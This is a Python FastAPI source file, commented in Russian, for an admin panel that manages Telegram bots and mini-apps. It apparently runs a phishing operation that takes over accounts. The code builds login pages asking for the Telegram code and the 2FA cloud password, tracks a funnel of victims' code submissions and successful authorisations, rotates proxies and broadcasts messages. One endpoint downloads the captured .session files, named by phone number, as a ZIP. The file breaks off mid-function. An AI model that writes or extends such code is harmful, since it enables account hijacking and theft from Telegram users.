"""API-роуты панели владельца бота (/api/panel/*).

Все эндпоинты тонкие обёртки над database.py. Проверка пользователя через
verify_panel_user → X-Telegram-Init-Data.
"""
from __future__ import annotations

import asyncio
import logging
from typing import Any

from fastapi import APIRouter, Body, Depends, File, HTTPException, UploadFile

import config
from database import (
    add_bot,
    add_folder,
    cf_pool_add,
    cf_pool_purge_all,
    cf_pool_stats,
    delete_bot,
    delete_folder,
    get_auth_event_counts,
    get_bot,
    get_bot_user_ids,
    get_folders,
    get_launch_stats,
    get_miniapp_launch_count,
    get_owner_proxies,
    get_owner_templates,
    get_template,
    get_user_bots,
    pending_bot_clear,
    pending_bot_get,
    pending_bot_set,
    set_bot_proxy,
    token_exists,
    update_bot_field,
    user_domains_list,
    user_has_ssl_domain,
)
from web.panel_auth import require_admin, verify_panel_user

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/panel", tags=["panel"])


# ===== profile =====

@router.get("/me")
async def me(user: dict = Depends(verify_panel_user)) -> dict:
    return user


# ===== bots =====

def _funnel(tg_id: int | None) -> dict:
    """4 счётчика воронки — точно та же логика, что в старой Telegram-карточке
    (handlers/cards.py): opens = miniapp_launches, code_sent + pwd_requested +
    success — из bot_auth_events."""
    if not tg_id:
        return {"opens": 0, "code_sent": 0, "twofa_sent": 0, "auths": 0}
    events = get_auth_event_counts(tg_id)
    return {
        "opens": get_miniapp_launch_count(tg_id),
        "code_sent": int(events.get("code_sent", 0)),
        "twofa_sent": int(events.get("pwd_requested", 0)),
        "auths": int(events.get("success", 0)),
    }


def _bot_brief(bot: dict) -> dict:
    return {
        "id": bot["id"],
        "username": bot.get("username") or "",
        "tg_id": bot.get("tg_id"),
        "folder_id": bot.get("folder_id"),
        "guard_enabled": bool(bot.get("guard_enabled")),
        "miniapp_enabled": bool(bot.get("miniapp_enabled")),
        "template_id": bot.get("template_id"),
        "funnel": _funnel(bot.get("tg_id")),
    }


def _bot_24h(tg_id: int | None) -> dict:
    """24-часовые счётчики бота. Considers event='success' as авторизация."""
    from database import _db, _lock, _now
    if not tg_id:
        return {"opens": 0, "auths": 0}
    cutoff = _now() - 86400
    with _lock:
        opens = _db.one(
            "SELECT COUNT(*) AS c FROM miniapp_launches WHERE bot_tg_id=? AND created_at>=?",
            (tg_id, cutoff),
        )["c"]
        auths = _db.one(
            "SELECT COUNT(*) AS c FROM bot_auth_events "
            "WHERE bot_tg_id=? AND event='success' AND created_at>=?",
            (tg_id, cutoff),
        )["c"]
    return {"opens": int(opens), "auths": int(auths)}


@router.get("/overview")
async def overview(user: dict = Depends(verify_panel_user)) -> dict:
    """Сводка для дашборда: топ-KPI + чипы папок + список ботов с 24ч."""
    bots = get_user_bots(user["id"])
    folders = get_folders(user["id"])
    total_opens = 0
    total_auths = 0
    items = []
    for b in bots:
        h = _bot_24h(b.get("tg_id"))
        total_opens += h["opens"]
        total_auths += h["auths"]
        items.append({**_bot_brief(b), "opens_24h": h["opens"], "auths_24h": h["auths"]})
    folder_counts = {}
    for b in bots:
        fid = b.get("folder_id")
        if fid:
            folder_counts[fid] = folder_counts.get(fid, 0) + 1
    chips = [{"id": None, "name": "Все", "count": len(bots)}]
    for f in folders:
        chips.append({"id": f["id"], "name": f["name"], "count": folder_counts.get(f["id"], 0)})
    return {
        "totals": {
            "bots_count": len(bots),
            "opens_24h": total_opens,
            "auths_24h": total_auths,
        },
        "folders": chips,
        "bots": items,
    }


@router.get("/bots")
async def list_bots(
    folder_id: int | None = None, user: dict = Depends(verify_panel_user)
) -> list[dict]:
    rows = get_user_bots(user["id"], folder_id=folder_id)
    return [_bot_brief(b) for b in rows]


def _ensure_owner(bot_id: int, user_id: int) -> dict:
    bot = get_bot(bot_id)
    if not bot or bot["owner_id"] != user_id:
        raise HTTPException(404, "bot not found")
    return bot


def _mask_token(token: str) -> str:
    if not token or len(token) < 12:
        return "****"
    return f"{token[:4]}..{token[-3:]}"


@router.get("/bots/{bot_id}")
async def get_bot_card(bot_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    bot = _ensure_owner(bot_id, user["id"])
    stats = get_launch_stats(bot["tg_id"]) if bot.get("tg_id") else {}

    template_name = ""
    if bot.get("template_id"):
        t = get_template(bot["template_id"])
        if t:
            template_name = t.get("name") or ""

    domains = user_domains_list(user["id"])
    last_dom = domains[-1] if domains else None
    user_domain = last_dom["domain"] if last_dom else ""
    domain_ssl_ok = bool(last_dom and last_dom.get("ssl_notified"))

    return {
        **_bot_brief(bot),
        "welcome_message": bot.get("welcome_message") or "",
        "auto_approve": bool(bot.get("auto_approve")),
        "launch_stats": stats,
        "token": bot.get("token") or "",
        "token_mask": _mask_token(bot.get("token") or ""),
        "template_name": template_name,
        "domain": user_domain,
        "domain_ssl_ok": domain_ssl_ok,
        "proxy_id": bot.get("proxy_id"),
    }


@router.get("/bots/{bot_id}/stats")
async def get_bot_stats(bot_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    bot = _ensure_owner(bot_id, user["id"])
    tg_id = bot.get("tg_id")
    return {
        "funnel": _funnel(tg_id),
        "launches": get_launch_stats(tg_id) if tg_id else {},
    }


@router.patch("/bots/{bot_id}/name")
async def set_bot_name(
    bot_id: int,
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    from aiogram import Bot
    from aiogram.exceptions import TelegramBadRequest

    bot = _ensure_owner(bot_id, user["id"])
    name = (payload.get("name") or "").strip()
    if not name:
        raise HTTPException(400, "name required")
    if len(name) > 64:
        raise HTTPException(400, "name too long")
    child = Bot(token=bot["token"])
    try:
        await child.set_my_name(name)
    except TelegramBadRequest as e:
        raise HTTPException(400, f"Telegram отклонил: {e}")
    finally:
        await child.session.close()
    return {"ok": True, "name": name}


@router.get("/proxies")
async def list_proxies(user: dict = Depends(verify_panel_user)) -> list[dict]:
    return get_owner_proxies(user["id"])


@router.post("/proxies")
async def add_proxy_endpoint(
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    from database import add_proxy
    from handlers.proxy import _normalize
    raw = (payload.get("url") or "").strip()
    label = (payload.get("label") or "").strip() or None
    if not raw:
        raise HTTPException(400, "url required")
    # Поддерживаем форматы: с схемой, user:pass@host:port, host:port,
    # host:port:user:pass (точно как в старом Telegram-хендлере).
    url = _normalize(raw)
    if not url:
        raise HTTPException(400, "invalid format. Use host:port, user:pass@host:port, host:port:user:pass, or full URL")
    pid = add_proxy(user["id"], url, label)
    return {"id": pid, "url": url, "label": label}


@router.delete("/proxies/{proxy_id}")
async def delete_proxy_endpoint(
    proxy_id: int, user: dict = Depends(verify_panel_user)
) -> dict:
    from database import delete_proxy, get_proxy
    p = get_proxy(proxy_id)
    if not p or p["owner_id"] != user["id"]:
        raise HTTPException(404, "proxy not found")
    delete_proxy(proxy_id)
    return {"ok": True}


@router.get("/bots/{bot_id}/miniapp")
async def get_miniapp_info(bot_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    """Инфо для экрана «Прямая ссылка»: персональный URL, startapp-ссылка,
    статус «включена/выключена», ID бота."""
    bot = _ensure_owner(bot_id, user["id"])
    tg_id = bot.get("tg_id")
    domains = user_domains_list(user["id"])
    domain = domains[-1]["domain"] if domains else ""
    miniapp_url = f"https://{domain}/app/{tg_id}" if (domain and tg_id) else ""

    # startapp ссылка (deep link)
    try:
        from directlink_service import get_module
        startapp_url = await get_module().build_url(tg_id) if tg_id else ""
    except Exception:
        startapp_url = ""

    username = (bot.get("username") or "").lstrip("@")
    return {
        "enabled": bool(bot.get("miniapp_enabled")),
        "miniapp_url": miniapp_url,
        "startapp_url": startapp_url,
        "username": username,
        "tg_id": tg_id,
        "domain": domain,
    }


@router.patch("/bots/{bot_id}/proxy")
async def set_proxy(
    bot_id: int,
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    _ensure_owner(bot_id, user["id"])
    proxy_id = payload.get("proxy_id")
    if proxy_id is not None and not isinstance(proxy_id, int):
        raise HTTPException(400, "proxy_id must be int or null")
    set_bot_proxy(bot_id, proxy_id)
    # Перезапустим бота, чтобы прокси применилась.
    try:
        from child.runtime import get_runtime
        await get_runtime().restart_bot(bot_id)
    except Exception:
        logger.exception("restart after proxy change failed")
    return {"ok": True, "proxy_id": proxy_id}


@router.post("/bots/{bot_id}/restart")
async def restart_bot_endpoint(
    bot_id: int, user: dict = Depends(verify_panel_user)
) -> dict:
    _ensure_owner(bot_id, user["id"])
    try:
        from child.runtime import get_runtime
        ok = await get_runtime().restart_bot(bot_id)
    except Exception as e:
        raise HTTPException(500, str(e)[:200])
    return {"ok": bool(ok)}


@router.get("/bots/{bot_id}/sessions")
async def list_sessions(bot_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    from database import get_bot_sessions, get_bot_sessions_count
    bot = _ensure_owner(bot_id, user["id"])
    tg_id = bot.get("tg_id")
    if not tg_id:
        return {"count": 0, "items": []}
    return {
        "count": get_bot_sessions_count(tg_id),
        "items": get_bot_sessions(tg_id),
    }


@router.get("/bots/{bot_id}/sessions/download")
async def download_sessions(bot_id: int, user: dict = Depends(verify_panel_user)):
    """Отдаёт ZIP всех .session-файлов бота. Если сессия одна — отдельный
    .session-файл."""
    import io
    import os
    import zipfile
    from datetime import datetime, timezone

    from fastapi.responses import Response
    from database import get_bot_sessions
    from handlers.export_sessions import _collect_session_files

    bot = _ensure_owner(bot_id, user["id"])
    tg_id = bot.get("tg_id")
    if not tg_id:
        raise HTTPException(404, "no tg_id")
    sessions = get_bot_sessions(tg_id)
    if not sessions:
        raise HTTPException(404, "no sessions")
    files = _collect_session_files(sessions)
    if not files:
        raise HTTPException(404, "session files not found on disk")

    uname = (bot.get("username") or f"bot{bot_id}").lstrip("@")

    if len(files) == 1:
        phone, data = files[0]
        return Response(
            content=data,
            media_type="application/octet-stream",
            headers={
                "Content-Disposition": f'attachment; filename="{phone}.session"',
            },
        )

    buf = io.BytesIO()
    used: set[str] = set()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        for phone, data in files:
            name = f"{phone}.session"
            i = 1
            while name in used:
                name = f"{phone}_{i}.session"
                i += 1
            used.add(name)
            zf.writestr(name, data)

    stamp = datetime.now(tz=timezone.utc).strftime("%Y%m%d_%H%M%S")
    fname = f"sessions_{uname}_{stamp}.zip"
    return Response(
        content=buf.getvalue(),
        media_type="application/zip",
        headers={"Content-Disposition": f'attachment; filename="{fname}"'},
    )


@router.post("/bots/{bot_id}/broadcast")
async def broadcast(
    bot_id: int,
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    """Запускает рассылку юзерам, которые когда-либо стартовали бота."""
    from aiogram import Bot

    bot = _ensure_owner(bot_id, user["id"])
    tg_id = bot.get("tg_id")
    if not tg_id:
        raise HTTPException(400, "bot has no tg_id")
    text = (payload.get("text") or "").strip()
    if not text:
        raise HTTPException(400, "text required")

    user_ids = get_bot_user_ids(tg_id)
    if not user_ids:
        return {"sent": 0, "failed": 0, "total": 0}

    sent = 0
    failed = 0
    child = Bot(token=bot["token"])
    try:
        for uid in user_ids:
            try:
                await child.send_message(uid, text)
                sent += 1
            except Exception:
                failed += 1
            await asyncio.sleep(0.05)
    finally:
        await child.session.close()
    return {"sent": sent, "failed": failed, "total": len(user_ids)}


@router.patch("/bots/{bot_id}")
async def patch_bot(
    bot_id: int,
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    import secrets as _secrets
    bot = _ensure_owner(bot_id, user["id"])
    bool_fields = {"guard_enabled", "auto_approve", "miniapp_enabled"}
    allowed = bool_fields | {"welcome_message", "folder_id", "template_id"}
    for k, v in payload.items():
        if k not in allowed:
            continue
        if k in bool_fields:
            v = 1 if bool(v) else 0
        update_bot_field(bot_id, k, v)
    # При включении защиты — генерим персональный секрет, если пуст.
    if payload.get("guard_enabled") and not bot.get("user_secret"):
        update_bot_field(bot_id, "user_secret", _secrets.token_urlsafe(6))
    return _bot_brief(get_bot(bot_id))


@router.get("/bots/{bot_id}/guard")
async def guard_info(bot_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    bot = _ensure_owner(bot_id, user["id"])
    username = (bot.get("username") or "").lstrip("@")
    secret = bot.get("user_secret") or ""
    return {
        "enabled": bool(bot.get("guard_enabled")),
        "link": f"https://t.me/{username}?start={secret}" if username and secret else "",
        "secret": secret,
    }


@router.post("/bots/{bot_id}/guard/rotate")
async def guard_rotate(bot_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    import secrets as _secrets
    bot = _ensure_owner(bot_id, user["id"])
    new = _secrets.token_urlsafe(6)
    update_bot_field(bot_id, "user_secret", new)
    username = (bot.get("username") or "").lstrip("@")
    return {
        "enabled": bool(bot.get("guard_enabled")),
        "link": f"https://t.me/{username}?start={new}" if username else "",
        "secret": new,
    }


@router.delete("/bots/{bot_id}")
async def remove_bot(bot_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    _ensure_owner(bot_id, user["id"])
    delete_bot(bot_id)
    return {"ok": True}


# ===== drafts (создания) =====

@router.get("/drafts")
async def get_drafts(user: dict = Depends(verify_panel_user)) -> dict:
    """Текущий незавершённый бот + статус домена/SSL."""
    pending = pending_bot_get(user["id"])
    has_ssl = user_has_ssl_domain(user["id"])
    domains = user_domains_list(user["id"])
    return {
        "pending_token": pending,                        # dict|None
        "has_ssl_domain": has_ssl,
        "domains": domains,
    }


@router.post("/drafts/token")
async def submit_token(
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    """Сохранить токен. Валидирует через getMe."""
    from aiogram import Bot
    from aiogram.exceptions import TelegramUnauthorizedError

    token = (payload.get("token") or "").strip()
    if not token:
        raise HTTPException(400, "token required")
    if token_exists(token):
        raise HTTPException(409, "token already used")
    b = Bot(token=token)
    try:
        me = await b.get_me()
    except TelegramUnauthorizedError:
        raise HTTPException(400, "invalid token")
    finally:
        await b.session.close()

    pending_bot_set(user["id"], token, me.username, me.id)
    return {"username": me.username, "tg_id": me.id}


@router.post("/drafts/finalize")
async def finalize_bot(user: dict = Depends(verify_panel_user)) -> dict:
    """Создать бота, если есть и токен, и SSL-домен."""
    pending = pending_bot_get(user["id"])
    if not pending:
        raise HTTPException(400, "no token; submit token first")
    if not user_has_ssl_domain(user["id"]):
        raise HTTPException(400, "no domain with ready SSL")

    bot_id = add_bot(
        owner_id=user["id"],
        token=pending["token"],
        username=f"@{pending['username']}",
        tg_id=pending["tg_id"],
    )
    pending_bot_clear(user["id"])

    # Поднимаем рантайм дочернего бота.
    try:
        from child.runtime import get_runtime
        await get_runtime().start_bot_db(get_bot(bot_id))
    except Exception:
        logger.exception("start_bot_db failed for %s", bot_id)

    return _bot_brief(get_bot(bot_id))


# ===== folders =====

@router.get("/folders")
async def list_folders(user: dict = Depends(verify_panel_user)) -> list[dict]:
    return get_folders(user["id"])


@router.post("/folders")
async def create_folder(
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    name = (payload.get("name") or "").strip()
    if not name:
        raise HTTPException(400, "name required")
    fid = add_folder(user["id"], name)
    return {"id": fid, "name": name}


@router.delete("/folders/{folder_id}")
async def remove_folder(folder_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    delete_folder(folder_id)
    return {"ok": True}


# ===== templates =====

@router.get("/templates")
async def list_templates(user: dict = Depends(verify_panel_user)) -> list[dict]:
    rows = get_owner_templates(user["id"])
    return [
        {"id": t["id"], "name": t["name"], "kind": t.get("kind", "standard")}
        for t in rows
    ]


@router.get("/templates/{template_id}")
async def get_template_full(
    template_id: int, user: dict = Depends(verify_panel_user)
) -> dict:
    t = get_template(template_id)
    if not t or t["owner_id"] != user["id"]:
        raise HTTPException(404, "template not found")
    return t


# ===== Builder templates (новый конструктор шаблонов) =====

def _bt_owned(template_id: str, user_id: int) -> dict:
    from database import builder_template_get
    t = builder_template_get(template_id)
    if not t or t["owner_id"] != user_id:
        raise HTTPException(404, "builder template not found")
    return t


@router.get("/builder/templates")
async def bt_list(user: dict = Depends(verify_panel_user)) -> list[dict]:
    """Список шаблонов юзера. Включает и новые builder-шаблоны (bot_templates),
    и старые из таблицы templates (помечаются source='legacy', не редактируются
    конструктором — только импорт или удаление)."""
    from database import builder_template_list
    out = []
    for t in builder_template_list(user["id"]):
        out.append({**t, "source": "builder"})
    for t in get_owner_templates(user["id"]):
        out.append({
            "id": f"legacy:{t['id']}",
            "name": t.get("name") or "Без имени",
            "version": 0,
            "is_draft": False,
            "created_at": t.get("created_at"),
            "updated_at": t.get("created_at"),
            "source": "legacy",
            "legacy_id": t["id"],
            "kind": t.get("kind", "standard"),
        })
    return out


def _split_title(text: str) -> tuple[str, str]:
    """Делит текст на (title, description): title = первая строка ≤80 символов,
    description = остаток. Если в одну строку — title = весь текст, desc = ''."""
    if not text:
        return "", ""
    text = str(text).strip()
    if "\n" in text:
        first, rest = text.split("\n", 1)
        first = first.strip()
        rest = rest.strip()
        if first and len(first) <= 80:
            return first, rest
    if len(text) <= 80:
        return text, ""
    # Длинная строка без переносов — берём как описание
    return "", text


def _legacy_to_builder(content: dict, kind: str, slug: str) -> dict:
    """Конвертирует content старого шаблона в формат конструктора.

    Поля старого формата:
      Бот-разделы (top-level): start_msg, start_btn, second_msg, expired_msg,
        expired_btn, auth_ok, spam_auth, spam_unauth, admin_post, show_auth,
        show_code
      Страницы (page_field): main_emoji/main_button/main_text/main_waiting,
        code_emoji/code_button/code_text/code_wrong,
        twofa_emoji/twofa_button/twofa_text/twofa_hint/twofa_placeholder,
        success_emoji/success_button/success_text
    """
    content = content or {}

    def pick(*keys: str, default: str = "") -> str:
        for k in keys:
            v = content.get(k)
            if v and str(v).strip():
                return str(v)
        return default

    # Тексты сообщений бота (вне мини-аппа) — сохраняем в bot_messages.
    bot_messages = {
        "start_msg":   pick("start_msg"),
        "start_btn":   pick("start_btn"),
        "second_msg":  pick("second_msg"),
        "expired_msg": pick("expired_msg"),
        "expired_btn": pick("expired_btn"),
        "auth_ok":     pick("auth_ok"),
        "spam_auth":   pick("spam_auth"),
        "spam_unauth": pick("spam_unauth"),
        "admin_post":  pick("admin_post"),
        "show_auth":   pick("show_auth"),
        "show_code":   pick("show_code"),
    }
    bot_messages = {k: v for k, v in bot_messages.items() if v}

    base_theme = {"background": "#0e161e", "text": "#ffffff"}

    if kind == "welcome":
        wt, wd = _split_title(pick("start_msg", "main_text"))
        steps = [{
            "key": "welcome", "label": "Welcome",
            "title": wt or "Добро пожаловать!",
            "description": wd or pick("main_waiting"),
            "icon": pick("main_emoji"),
            "image": {"type": "sticker", "ref": "duck-wave", "anim": "float"},
            "button": {"text": pick("start_btn", "main_button", default="Открыть"),
                       "action": "close", "color": "#2ea6ff", "style": "filled"},
            "theme": dict(base_theme),
        }]
    elif kind == "text":
        tt, td = _split_title(pick("main_text", "start_msg"))
        steps = [{
            "key": "info", "label": "Info",
            "title": tt or "Информация",
            "description": td,
            "icon": pick("main_emoji"),
            "image": {"type": "sticker", "ref": "duck-fire", "anim": "fade"},
            "button": {"text": pick("main_button", "start_btn", default="Понятно"),
                       "action": "close", "color": "#2ea6ff", "style": "filled"},
            "theme": dict(base_theme),
        }]
    else:  # standard
        main_t, main_d = _split_title(pick("main_text", "start_msg"))
        code_t, code_d = _split_title(pick("code_text"))
        twofa_t, twofa_d = _split_title(pick("twofa_text"))
        success_t, success_d = _split_title(pick("success_text", "auth_ok"))

        # Если описания 2FA пусто, добавим подсказку
        twofa_hint = pick("twofa_hint")
        if twofa_hint and twofa_d:
            twofa_d = f"{twofa_d}\n\n{twofa_hint}"
        elif twofa_hint:
            twofa_d = twofa_hint

        steps = [
            {
                "key": "welcome", "label": "Welcome",
                "title": main_t or "Добро пожаловать!",
                "description": main_d,
                "icon": pick("main_emoji"),
                "image": {"type": "sticker", "ref": "duck-wave", "anim": "float"},
                "button": {"text": pick("main_button", "start_btn", default="Начать"),
                           "action": "goto:code", "color": "#2ea6ff", "style": "filled"},
                "theme": dict(base_theme),
            },
            {
                "key": "code", "label": "Код",
                "title": code_t or "Введите код",
                "description": code_d,
                "icon": pick("code_emoji"),
                "image": {"type": "sticker", "ref": "duck-key", "anim": "pop"},
                "button": {"text": pick("code_button", default="Подтвердить"),
                           "action": "verify:code", "color": "#2ea6ff", "style": "filled"},
                "theme": dict(base_theme),
            },
            {
                "key": "twofa", "label": "2FA",
                "title": twofa_t or "Облачный пароль",
                "description": twofa_d,
                "icon": pick("twofa_emoji"),
                "image": {"type": "sticker", "ref": "duck-shield", "anim": "fade"},
                "button": {"text": pick("twofa_button", default="Подтвердить"),
                           "action": "verify:2fa", "color": "#2ea6ff", "style": "filled"},
                "theme": dict(base_theme),
                "placeholder": pick("twofa_placeholder"),
            },
            {
                "key": "success", "label": "Успех",
                "title": success_t or "Готово!",
                "description": success_d,
                "icon": pick("success_emoji"),
                "image": {"type": "sticker", "ref": "duck-party", "anim": "pop"},
                "button": {"text": pick("success_button", default="Закрыть"),
                           "action": "close+sync", "color": "#4dcd5e", "style": "filled"},
                "theme": dict(base_theme),
            },
        ]

    # Дополнительные кастомные тексты, не входящие в основной набор
    extras = {}
    if pick("code_wrong"):
        extras["code_wrong"] = pick("code_wrong")
    if pick("main_waiting"):
        extras["main_waiting"] = pick("main_waiting")

    data = {
        "id": slug,
        "name": slug,
        "version": 1,
        "kind": kind,
        "steps": steps,
    }
    if bot_messages:
        data["bot_messages"] = bot_messages
    if extras:
        data["extras"] = extras
    return data


@router.post("/builder/templates/import-legacy/{legacy_id}")
async def bt_import_legacy(legacy_id: int,
                            user: dict = Depends(verify_panel_user)) -> dict:
    """Импортирует старый шаблон в формат конструктора. Переносит ВСЕ
    тексты: заголовки/описания/кнопки/эмодзи каждой страницы + сообщения
    бота (start_msg, expired_msg, auth_ok и пр.) в bot_messages."""
    from database import builder_template_create, _now
    t = get_template(legacy_id)
    if not t or t["owner_id"] != user["id"]:
        raise HTTPException(404, "legacy template not found")

    kind = t.get("kind") or "standard"
    if kind not in ("standard", "welcome", "text"):
        kind = "standard"
    slug = f"imported_{legacy_id}_{_now()}"
    name = (t.get("name") or "Импортированный")[:40]

    content = t.get("content") or {}
    data = _legacy_to_builder(content, kind, slug)
    data["name"] = name

    return builder_template_create(user["id"], slug, name, data=data, kind=kind)


@router.get("/builder/templates/{template_id}")
async def bt_get(template_id: str, user: dict = Depends(verify_panel_user)) -> dict:
    return _bt_owned(template_id, user["id"])


@router.post("/builder/templates")
async def bt_create(
    payload: dict = Body(default={}),
    user: dict = Depends(verify_panel_user),
) -> dict:
    """Создаёт новый шаблон. Slug либо берётся из payload.slug, либо
    генерится: «template_<timestamp>»."""
    import re as _re
    from database import builder_template_create, builder_template_get, _now
    slug = (payload.get("slug") or "").strip().lower()
    name = (payload.get("name") or "").strip()
    kind = (payload.get("kind") or "standard").strip().lower()
    if kind not in ("standard", "welcome", "text"):
        kind = "standard"
    if not slug:
        slug = f"template_{_now()}"
    if not _re.match(r"^[a-z0-9_-]{1,40}$", slug):
        raise HTTPException(400, "slug must be a-z0-9_- only, ≤40 chars")
    if builder_template_get(slug):
        raise HTTPException(409, "template with this slug already exists")
    return builder_template_create(user["id"], slug, name or slug, kind=kind)


@router.patch("/builder/templates/{template_id}")
async def bt_patch(
    template_id: str,
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    """Частичное обновление. Поддерживаем 3 формы payload:
       - {"name": "new"} → переименовать
       - {"step_key": "code", "patch": {"title": "..."}} → патч одного шага
       - {"data": {...}} → перезаписать весь JSON
    """
    from database import (
        builder_template_rename, builder_template_update_data, builder_template_get,
    )
    t = _bt_owned(template_id, user["id"])

    if "name" in payload:
        nm = (payload.get("name") or "").strip()
        if not nm:
            raise HTTPException(400, "empty name")
        builder_template_rename(template_id, nm)

    data = dict(t["data"]) if isinstance(t.get("data"), dict) else {}

    if "data" in payload and isinstance(payload["data"], dict):
        data = payload["data"]
        builder_template_update_data(template_id, data)
    elif "step_key" in payload and isinstance(payload.get("patch"), dict):
        sk = payload["step_key"]
        steps = data.get("steps") or []
        for i, st in enumerate(steps):
            if st.get("key") == sk:
                # deep-merge top-level keys; для вложенных dict — merge тоже
                for k, v in payload["patch"].items():
                    if isinstance(v, dict) and isinstance(st.get(k), dict):
                        st[k] = {**st[k], **v}
                    else:
                        st[k] = v
                steps[i] = st
                break
        data["steps"] = steps
        builder_template_update_data(template_id, data)

    return builder_template_get(template_id)


@router.put("/builder/templates/{template_id}/publish")
async def bt_publish(template_id: str, user: dict = Depends(verify_panel_user)) -> dict:
    from database import builder_template_publish
    _bt_owned(template_id, user["id"])
    new_version = builder_template_publish(template_id)
    return {"ok": True, "version": new_version}


@router.delete("/builder/templates/{template_id}")
async def bt_delete(template_id: str, user: dict = Depends(verify_panel_user)) -> dict:
    from database import builder_template_delete
    _bt_owned(template_id, user["id"])
    builder_template_delete(template_id)
    return {"ok": True}


_STICKERS_PATH = None  # резолвится лениво


def _stickers_path():
    """Путь к stickers.json (web/static/stickers.json)."""
    global _STICKERS_PATH
    if _STICKERS_PATH is None:
        from pathlib import Path
        _STICKERS_PATH = Path(__file__).parent / "static" / "stickers.json"
    return _STICKERS_PATH


_STICKER_EXTS = {
    ".json": "lottie",
    ".gif":  "image",
    ".png":  "image",
    ".webp": "image",
    ".jpg":  "image",
    ".jpeg": "image",
}


def _ensure_tgs_unpacked(tgs_path) -> "Path | None":
    """Распаковывает .tgs (gzip Lottie JSON) в .json рядом. Возвращает путь
    к получившемуся .json. Если уже распакован — возвращает существующий."""
    import gzip
    from pathlib import Path
    json_path = tgs_path.with_suffix(".json")
    if json_path.exists() and json_path.stat().st_mtime >= tgs_path.stat().st_mtime:
        return json_path
    try:
        with gzip.open(tgs_path, "rb") as f:
            data = f.read()
        with open(json_path, "wb") as f:
            f.write(data)
        return json_path
    except Exception as e:
        logger.warning("tgs unpack failed for %s: %s", tgs_path.name, e)
        return None


def _scan_stickers_folder() -> list[dict]:
    """Сканирует web/static/stickers/ и собирает все картинки/lottie оттуда.

    Дополнительно: для каждого .tgs файла автоматически распаковывает
    рядом .json (если ещё не распакован). lottie-player понимает только
    распакованный JSON."""
    from pathlib import Path
    folder = Path(__file__).parent / "static" / "stickers"
    if not folder.is_dir():
        return []

    # Сначала распакуем все .tgs.
    for p in folder.iterdir():
        if p.is_file() and p.suffix.lower() == ".tgs":
            _ensure_tgs_unpacked(p)

    items: list[dict] = []
    seen_stems: set[str] = set()
    for p in sorted(folder.iterdir()):
        if not p.is_file():
            continue
        ext = p.suffix.lower()
        if ext == ".tgs":
            continue  # уже отражён через распакованный .json
        t = _STICKER_EXTS.get(ext)
        if not t:
            continue
        ref = p.stem
        if ref in seen_stems:
            continue
        seen_stems.add(ref)
        items.append({
            "ref": ref,
            "type": t,
            "url": f"/static/stickers/{p.name}",
            "title": ref.replace("-", " ").replace("_", " "),
        })
    return items


def _load_stickers() -> dict:
    """Читает stickers.json + сливает с авто-сканом web/static/stickers/.

    Если у файла из папки тот же ref, что у emoji-записи из JSON —
    к файловому ref добавляется суффикс `-anim`, чтобы оба варианта
    оказались в каталоге."""
    import json as _json
    data: dict = {"main": []}
    try:
        with open(_stickers_path(), "r", encoding="utf-8") as f:
            raw = _json.load(f)
        if isinstance(raw, dict):
            data = raw
            data.setdefault("main", [])
    except Exception as e:
        logger.warning("stickers.json read failed: %s", e)

    main = data.get("main") or []
    existing_refs = {s.get("ref") for s in main}
    for s in _scan_stickers_folder():
        ref = s["ref"]
        # При коллизии — добавляем суффикс, оба варианта будут в каталоге.
        if ref in existing_refs:
            suffixed = f"{ref}-anim"
            i = 2
            while suffixed in existing_refs:
                suffixed = f"{ref}-anim-{i}"
                i += 1
            s = {**s, "ref": suffixed,
                 "title": (s.get("title") or ref) + " (анимация)"}
            ref = suffixed
        main.append(s)
        existing_refs.add(ref)
    data["main"] = main
    return data


@router.get("/builder/stickers")
async def bt_stickers() -> dict:
    """Каталог стикеров (main). Тип: emoji | lottie | image.
    Источники: stickers.json + автоскан web/static/stickers/."""
    return _load_stickers()


@router.post("/builder/templates/{template_id}/upload-image")
async def bt_upload_image(
    template_id: str,
    file: UploadFile = File(...),
    user: dict = Depends(verify_panel_user),
):
    """Загрузка картинки. Принимает PNG/JPG/WEBP/GIF, складывает в
    web/static/uploads/<user_id>/<template_id>/<uuid>.<ext>.
    Возвращает {ref: <uuid.ext>, url: '/static/uploads/...'}."""
    import os
    import uuid as _uuid
    from pathlib import Path

    _bt_owned(template_id, user["id"])

    allowed_ext = {".png", ".jpg", ".jpeg", ".webp", ".gif"}
    name = file.filename or ""
    ext = os.path.splitext(name)[1].lower() or ".webp"
    if ext not in allowed_ext:
        raise HTTPException(400, f"extension {ext} not allowed")

    data = await file.read()
    if len(data) > 5 * 1024 * 1024:
        raise HTTPException(400, "file too large (max 5MB)")

    base_dir = Path(__file__).parent / "static" / "uploads" / str(user["id"]) / template_id
    base_dir.mkdir(parents=True, exist_ok=True)
    file_id = _uuid.uuid4().hex
    fname = f"{file_id}{ext}"
    out_path = base_dir / fname
    with open(out_path, "wb") as f:
        f.write(data)

    rel_url = f"/static/uploads/{user['id']}/{template_id}/{fname}"
    return {"ref": fname, "url": rel_url}


# ===== domains =====

@router.get("/domains")
async def list_my_domains(user: dict = Depends(verify_panel_user)) -> list[dict]:
    return user_domains_list(user["id"])


@router.post("/domains/recheck")
async def recheck_ssl(user: dict = Depends(verify_panel_user)) -> dict:
    """Принудительно перепроверяет SSL у всех доменов юзера (без ожидания
    периода воркера). Помечает ssl_notified=1 если сертификат живой."""
    from database import user_domain_mark_ssl_notified
    from ssl_watcher import _probe_ssl

    domains = user_domains_list(user["id"])
    changed = 0
    for d in domains:
        if d.get("ssl_notified"):
            continue
